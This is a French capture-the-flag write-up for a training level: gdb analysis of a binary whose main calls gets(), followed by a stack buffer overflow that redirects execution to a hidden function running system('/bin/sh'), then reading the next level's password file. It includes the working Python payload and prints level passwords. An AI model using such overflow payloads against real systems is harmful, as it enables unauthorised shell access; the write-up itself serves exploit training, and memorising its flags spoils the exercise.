# LEVEL 1

On se connecte sur le level1, ou se trouve un **binaire** `level1.`

On cherche a savoir ce que fait ce binaire:
```gdb
> gdb level1 -q
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) > disas main
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
```

En regardant les fonctions utlisées, on trouve :

```gdb
(gdb) > info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```

On trouve une fonction qui n'est pas utlisée **run** :

```
(gdb) > disas run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x80497c0,%eax
   0x0804844f <+11>:    mov    %eax,%edx
   0x08048451 <+13>:    mov    $0x8048570,%eax
   0x08048456 <+18>:    mov    %edx,0xc(%esp)
   0x0804845a <+22>:    movl   $0x13,0x8(%esp)
   0x08048462 <+30>:    movl   $0x1,0x4(%esp)
   0x0804846a <+38>:    mov    %eax,(%esp)
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    movl   $0x8048584,(%esp)
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave
   0x0804847f <+59>:    ret
End of assembler dump.
```

> Ici on observe l'appelle de la commande **system** avec comme argument 0x8048584:
```gdb
x/s 0x8048584
0x8048584:       "/bin/sh"
```

On sait que l'on va devoir utliser la fonction **run** qui fait un **system("/bin/sh")**. Pour cela nous allons effectuer un buffer **overflow**.

```gdb
gdb > ./level1
(gdb) b *main+21
Breakpoint 1 at 0x8048495
(gdb) run
Starting program: /home/user/level1/level1
BBBB

Breakpoint 1, 0x08048495 in main ()
(gdb) x/20x $esp
0xbffff6d0:     0xbffff6e0      0x0000002f      0xbffff72c      0xb7fd0ff4
0xbffff6e0:     0x42424242      0x08049700      0x00000002      0x08048321
0xbffff6f0:     0xb7fd13e4      0x00000016      0x0804978c      0x080484c1
0xbffff700:     0xffffffff      0xb7e5edc6      0xb7fd0ff4      0xb7e5ee55
0xbffff710:     0xb7fed280      0x00000000      0x080484a9      0xb7fd0ff4

(gdb) i f
Stack level 0, frame at 0xbffff730:
 eip = 0x8048495 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff728, args:
 Locals at 0xbffff728, Previous frame's sp is 0xbffff730
 Saved registers:
  ebp at 0xbffff728, eip at 0xbffff72c

```


> 0xbffff72c => EIP
>
> 0xbffff6e0 => Buffer beginning
>
> offset = 0xbffff72c - 0xbffff6e0 = 76

```bash
python -c "print 'A' * 76 + '\x44\x84\x04\x08'" | ./level1
Good... Wait what?
```

> \x44\x84\x04\x08 => 0x08048444, adresse de la fonction **run**

On se rend compte que nous ne restons pas dans le shell une fois le programme fini, donc on utilise la commande **cat** pour laisser ouvert le stdin du pipe:

```
(python -c "print 'A' * 76 + '\x44\x84\x04\x08'"; cat) | ./level1
Good... Wait what?
> cd ../level2 && cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

For download :
`scp -P4242 level1@IP:level1 .`
> Password : 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a